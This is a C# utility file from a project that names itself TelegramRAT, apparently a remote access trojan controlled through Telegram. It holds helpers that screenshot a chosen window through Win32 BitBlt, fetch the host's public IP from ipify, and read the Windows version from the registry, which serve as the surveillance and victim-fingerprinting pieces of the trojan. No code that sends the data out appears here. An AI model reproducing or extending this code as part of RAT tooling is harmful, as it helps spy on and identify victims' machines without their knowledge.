using Microsoft.Win32;
using System.Drawing;

namespace TelegramRAT.Utilities;

static class Utils
{
    public static void CaptureWindow(IntPtr hWnd, Stream buffer)
    {
        WinAPI.GetClientRect(hWnd, out Rectangle windowbounds);

        Bitmap windowCap = new Bitmap(windowbounds.Width, windowbounds.Height);

        Graphics wndGraphics = Graphics.FromImage(windowCap);

        IntPtr graphicsDc = wndGraphics.GetHdc();

        IntPtr windowDc = WinAPI.GetDC(hWnd);

        WinAPI.BitBlt(graphicsDc, 0, 0, windowbounds.Width, windowbounds.Height, windowDc, 0, 0, 13369376);

        wndGraphics.ReleaseHdc();

        windowCap.Save(buffer, System.Drawing.Imaging.ImageFormat.Png);
    }

    public static async Task<string> GetIpAddressAsync()
    {
        HttpClient client = new HttpClient();
        string ip = await client.GetStringAsync("https://api.ipify.org/?format=json");
        ip = string.Join(string.Empty, ip.Skip(7).SkipLast(2));
        return ip;
    }

    public static string GetWindowsVersion()
    {
        try
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            if (key != null)
            {
                string prodName = key.GetValue("ProductName") as string;
                string csdVer = key.GetValue("CSDVersion") as string;
                return prodName + csdVer;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
        }
        return string.Empty;
    }
}
